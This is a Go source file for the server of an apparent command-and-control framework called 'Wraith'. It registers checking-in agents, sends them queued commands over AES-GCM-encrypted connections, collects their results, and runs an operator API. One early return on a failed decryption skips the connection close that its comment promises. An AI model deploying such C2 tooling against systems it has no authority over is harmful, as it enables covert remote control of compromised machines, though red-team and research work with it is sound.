package server

import (
	"fmt"
	"net"
	"net/http"
	"strings"
	"github.com/Kronoscba/wraith/server/api"
	"github.com/Kronoscba/wraith/server/config"
	"github.com/Kronoscba/wraith/server/crypto"
	"github.com/Kronoscba/wraith/server/db"
	"github.com/Kronoscba/wraith/server/handler"
	"github.com/Kronoscba/wraith/server/listener"
)

type Server struct {
	Listeners []listener.Listener
	Agents    *handler.AgentHandler
	Tasks     *handler.TaskManager
	DB        *db.DB
	Cfg       *config.Config
}

func NewServer(cfg *config.Config) (*Server, error) {
	database, err := db.NewDB(cfg.DBPath)
	if err != nil {
		return nil, err
	}

	return &Server{
		Listeners: make([]listener.Listener, 0),
		Agents:    handler.NewAgentHandler(database.Conn),
		Tasks:     handler.NewTaskManager(database.Conn),
		DB:        database,
		Cfg:       cfg,
	}, nil
}

func (s *Server) AddListener(l listener.Listener) {
	s.Listeners = append(s.Listeners, l)
}

func (s *Server) Start() error {
	for _, l := range s.Listeners {
		if err := l.Start(s.HandleConnection); err != nil {
			return err
		}
	}
	fmt.Println("Wraith C2 Server started...")
	return nil
}

// HandleConnection is intended to be called by the listeners when a new agent connects.
func (s *Server) HandleConnection(conn net.Conn) {
	// ponytail: removed defer conn.Close() to allow agent to wait for task
	
	// 1. Read Check-in
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		conn.Close()
		return
	}

	// ponytail: decrypt before parsing
	decrypted, err := crypto.DecryptAESGCM(buf[:n], []byte(s.Cfg.SharedKey))
	if err != nil {
		fmt.Printf("DECRYPT FAIL: %v\n", err); conn.Close()
		return
	}
	msg := string(decrypted)
	// ponytail: very naive check-in parsing
	var agentID string
	if len(msg) > 8 && msg[:8] == "CHECKIN:" {
		agentID = msg[8:]
		s.Agents.RegisterAgent(agentID, conn)
		fmt.Printf("Agent %s checked in\n", agentID)

		// 2. Send Pending Task
		task, err := s.Tasks.GetPendingTask(agentID)
		if err == nil {
			fmt.Printf("Sending task %s to agent %s\n", task.ID, agentID)
			payload := []byte("TASK:" + task.ID + ":" + task.Command)
			encrypted, _ := crypto.EncryptAESGCM(payload, []byte(s.Cfg.SharedKey))
			conn.Write(encrypted)
			
			// 3. Wait for result (synchronous for now)
			resBuf := make([]byte, 4096)
			rn, err := conn.Read(resBuf)
			if err == nil {
				decrypted, err := crypto.DecryptAESGCM(resBuf[:rn], []byte(s.Cfg.SharedKey))
				if err != nil {
					// ponytail: don't close here, let the outer close handle it
					return
				}
				resMsg := string(decrypted)
				if len(resMsg) > 7 && resMsg[:7] == "RESULT:" {
					parts := strings.SplitN(resMsg[7:], ":", 2)
					if len(parts) == 2 {
						taskID := parts[0]
						result := parts[1]
						s.Tasks.CompleteTask(agentID, taskID, result)
						fmt.Printf("Task %s completed: %s\n", taskID, result)
					}
				}
			}
		}
	}
	if agentID != "" {
		s.Agents.DeactivateAgent(agentID)
	}
	conn.Close()
}

func (s *Server) StartAPI(port string) error {
	mux := http.NewServeMux()
	api := api.NewAPI(s.Agents, s.Tasks)
	api.RegisterRoutes(mux)

	fmt.Printf("API Server starting on port %s...\n", port)
	return http.ListenAndServe(":"+port, mux)
}
